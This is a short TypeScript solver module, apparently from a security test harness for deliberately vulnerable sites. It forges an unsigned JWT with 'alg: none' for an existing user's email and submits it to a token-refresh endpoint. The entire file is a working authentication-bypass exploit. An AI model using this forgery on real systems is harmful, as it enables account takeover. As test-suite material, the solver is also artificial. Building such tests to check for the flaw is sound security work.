// Token forgery on refresh: craft an unsigned token for an existing subject and present it to the
// refresh endpoint, which accepts it without an issued signature.
import type { SolverCtx } from '../../../../tests/helpers/site-matrix.ts'

function b64url(s: string): string {
  return Buffer.from(s).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
}

export async function solve(ctx: SolverCtx): Promise<void> {
  const header = b64url(JSON.stringify({ alg: 'none', typ: 'JWT' }))
  const sub = ctx.plan.personas.persona_a.email
  const payload = b64url(JSON.stringify({ sub, iat: Date.now() }))
  const token = `${header}.${payload}.`
  const tokenField = ctx.plan.params.token ?? 'token'
  await ctx.fetch(ctx.path('refreshToken'), {
    method: 'POST',
    body: { [tokenField]: token, token },
  })
}
